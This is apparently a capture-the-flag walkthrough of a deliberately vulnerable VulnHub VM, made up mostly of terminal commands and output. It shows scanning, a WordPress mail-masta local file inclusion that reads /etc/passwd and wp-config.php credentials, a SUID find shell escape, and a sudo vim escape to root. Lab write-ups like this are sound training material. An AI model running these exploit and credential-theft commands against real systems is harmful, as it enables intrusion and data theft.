https://www.vulnhub.com/entry/6days-lab-11,156/


sudo netdiscover -i vboxnet0 -r 192.168.110.0/24
fping --quiet --alive --generate 192.168.110.0/24



└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.54
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 21:37 CEST
Nmap scan report for 192.168.110.54
Host is up (0.00042s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 45:c9:a3:6f:55:f1:7f:30:bf:33:36:45:e7:18:cc:e1 (RSA)
|   256 d8:dd:35:cc:80:a3:19:67:ed:6f:dd:3b:e5:cf:93:fc (ECDSA)
|_  256 13:1d:0a:4c:ee:23:7b:56:20:5e:66:8e:f2:d8:71:be (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:76:B7:CF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.110.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds



└─$ dirb http://192.168.110.54              

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Oct  4 21:38:37 2021
URL_BASE: http://192.168.110.54/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.54/ ----
+ http://192.168.110.54/index.html (CODE:200|SIZE:10701)                                             
+ http://192.168.110.54/server-status (CODE:403|SIZE:279)                                            
==> DIRECTORY: http://192.168.110.54/wp/                                                             
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/ ----
+ http://192.168.110.54/wp/index.php (CODE:301|SIZE:0)                                               
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/                                                    
==> DIRECTORY: http://192.168.110.54/wp/wp-content/                                                  
==> DIRECTORY: http://192.168.110.54/wp/wp-includes/                                                 
+ http://192.168.110.54/wp/xmlrpc.php (CODE:405|SIZE:42)                                             
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/ ----
+ http://192.168.110.54/wp/wp-admin/admin.php (CODE:302|SIZE:0)                                      
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/css/                                                
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/images/                                             
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/includes/                                           
+ http://192.168.110.54/wp/wp-admin/index.php (CODE:302|SIZE:0)                                      
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/js/                                                 
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/maint/                                              
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/network/                                            
==> DIRECTORY: http://192.168.110.54/wp/wp-admin/user/                                               
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-content/ ----
+ http://192.168.110.54/wp/wp-content/index.php (CODE:200|SIZE:0)                                    
==> DIRECTORY: http://192.168.110.54/wp/wp-content/languages/                                        
==> DIRECTORY: http://192.168.110.54/wp/wp-content/plugins/                                          
==> DIRECTORY: http://192.168.110.54/wp/wp-content/themes/                                           
==> DIRECTORY: http://192.168.110.54/wp/wp-content/upgrade/                                          
==> DIRECTORY: http://192.168.110.54/wp/wp-content/uploads/                                          
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want vulnvmto scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/network/ ----
+ http://192.168.110.54/wp/wp-admin/network/admin.php (CODE:302|SIZE:0)                              
+ http://192.168.110.54/wp/wp-admin/network/index.php (CODE:302|SIZE:0)                              
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-admin/user/ ----
+ http://192.168.110.54/wp/wp-admin/user/admin.php (CODE:302|SIZE:0)                                 
+ http://192.168.110.54/wp/wp-admin/user/index.php (CODE:302|SIZE:0)                                 
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-content/plugins/ ----
+ http://192.168.110.54/wp/wp-content/plugins/index.php (CODE:200|SIZE:0)                            
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-content/themes/ ----
+ http://192.168.110.54/wp/wp-content/themes/index.php (CODE:200|SIZE:0)                             
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://192.168.110.54/wp/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Oct  4 21:38:42 2021
DOWNLOADED: 36896 - FOUND: 13
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo vi /etc/hosts                             
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo vi /etc/hosts        
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo vi /etc/hosts
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.110.53  888.darknet.com
192.168.110.53  signal8.darknet.com
192.168.110.54  vulnvm.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ ping vulnvm.local         
PING vulnvm.local (192.168.110.54) 56(84) bytes of data.
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=1 ttl=64 time=0.199 ms
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=2 ttl=64 time=0.246 ms
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=3 ttl=64 time=0.364 ms
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=4 ttl=64 time=0.541 ms
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=5 ttl=64 time=0.494 ms
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=6 ttl=64 time=0.472 ms
64 bytes from vulnvm.local (192.168.110.54): icmp_seq=7 ttl=64 time=0.553 ms
^C
--- vulnvm.local ping statistics ---
7 packets transmitted, 7 received, 0% packet loss, time 6083ms
rtt min/avg/max/mdev = 0.199/0.409/0.553/0.132 ms
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ dirb http://vulnvm.local  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Oct  4 21:44:17 2021
URL_BASE: http://vulnvm.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://vulnvm.local/ ----
+ http://vulnvm.local/index.html (CODE:200|SIZE:10701)                                               
+ http://vulnvm.local/server-status (CODE:403|SIZE:277)                                              
==> DIRECTORY: http://vulnvm.local/wp/                                                               
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/ ----
+ http://vulnvm.local/wp/index.php (CODE:301|SIZE:0)                                                 
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/                                                      
==> DIRECTORY: http://vulnvm.local/wp/wp-content/                                                    
==> DIRECTORY: http://vulnvm.local/wp/wp-includes/                                                   
+ http://vulnvm.local/wp/xmlrpc.php (CODE:405|SIZE:42)                                               
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/ ----
+ http://vulnvm.local/wp/wp-admin/admin.php (CODE:302|SIZE:0)                                        
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/css/                                                  
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/images/                                               
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/includes/                                             
+ http://vulnvm.local/wp/wp-admin/index.php (CODE:302|SIZE:0)                                        
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/js/                                                   
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/maint/                                                
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/network/                                              
==> DIRECTORY: http://vulnvm.local/wp/wp-admin/user/                                                 
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-content/ ----
+ http://vulnvm.local/wp/wp-content/index.php (CODE:200|SIZE:0)                                      
==> DIRECTORY: http://vulnvm.local/wp/wp-content/languages/                                          
==> DIRECTORY: http://vulnvm.local/wp/wp-content/plugins/                                            
==> DIRECTORY: http://vulnvm.local/wp/wp-content/themes/                                             
==> DIRECTORY: http://vulnvm.local/wp/wp-content/upgrade/                                            
==> DIRECTORY: http://vulnvm.local/wp/wp-content/uploads/                                            
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/network/ ----
+ http://vulnvm.local/wp/wp-admin/network/admin.php (CODE:302|SIZE:0)                                
+ http://vulnvm.local/wp/wp-admin/network/index.php (CODE:302|SIZE:0)                                
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-admin/user/ ----
+ http://vulnvm.local/wp/wp-admin/user/admin.php (CODE:302|SIZE:0)                                   
+ http://vulnvm.local/wp/wp-admin/user/index.php (CODE:302|SIZE:0)                                   
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-content/plugins/ ----
+ http://vulnvm.local/wp/wp-content/plugins/index.php (CODE:200|SIZE:0)                              
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-content/themes/ ----
+ http://vulnvm.local/wp/wp-content/themes/index.php (CODE:200|SIZE:0)                               
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                     
---- Entering directory: http://vulnvm.local/wp/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Oct  4 21:44:21 2021
DOWNLOADED: 36896 - FOUND: 13
                                         
└─$ curl http://192.168.110.54/wp/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
jphdurand:x:1000:1000:jphdurand,,,:/home/jphdurand:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
cdrdurand:x:1001:1001::/home/cdrdurand:/bin/bash
chrdurand:x:1002:1002::/home/chrdurand:/bin/bash
jchdurand:x:1003:1003::/home/jchdurand:/bin/bash
jcldurand:x:1004:1004::/home/jcldurand:/bin/bash
jjqdurand:x:1005:1005::/home/jjqdurand:/bin/bash
jmcdurand:x:1006:1006::/home/jmcdurand:/bin/bash
jmkdurand:x:1007:1007::/home/jmkdurand:/bin/bash
jpldurand:x:1008:1008::/home/jpldurand:/bin/bash
mcldurand:x:1009:1009::/home/mcldurand:/bin/bash
mcndurand:x:1010:1010::/home/mcndurand:/bin/bash
ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin



└─$ curl http://192.168.110.54/wp/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wp/wp-config.php | base64 -d
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'wpuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'LXku0N5OI@&(jdGdo1' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );



[!] Valid Combinations Found:
 | Username: jphdurand, Password: LXku0N5OI@&(jdGdo1



 http://192.168.110.54/wp/wp-content/themes/twentytwelve/404.php



$ ls -al /home/*
/home/jmkdurand:
total 336
drwxr-xr-x  3 jmkdurand jmkdurand   4096 Nov 20  2020 .
drwxr-xr-x 13 root      root        4096 Nov 22  2020 ..
-rw-r--r--  1 jmkdurand jmkdurand    220 Nov 22  2020 .bash_logout
-rw-r--r--  1 jmkdurand jmkdurand   3526 Nov 22  2020 .bashrc
-rw-r--r--  1 jmkdurand jmkdurand    807 Nov 22  2020 .profile
drwx------  2 jmkdurand jmkdurand   4096 Nov 22  2020 .ssh
-rwsr-sr-x  1 jmkdurand jmkdurand 315904 Nov 22  2020 find


 $ ./find . -exec /bin/sh -p \; -quit



└─$ ssh jmkdurand@192.168.110.54 -i key



jmkdurand@vulnvm:~$ sudo -l
Entrées par défaut pour jmkdurand sur vulnvm :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utilisateur jmkdurand peut utiliser les commandes suivantes sur vulnvm :
    (ALL) NOPASSWD: /usr/sbin/apache2ctl, /usr/bin/vim /etc/apache2/*


jmkdurand@vulnvm:~$ sudo vi  /etc/apache2/sites-available/000-default.conf 
:/bin/sh
root@vulnvm:/home/jmkdurand# id
uid=0(root) gid=0(root) groupes=0(root)
root@vulnvm:~# cat /root/root.txt 
LPM{QnJhdm8gw6Agdm91cyEK}
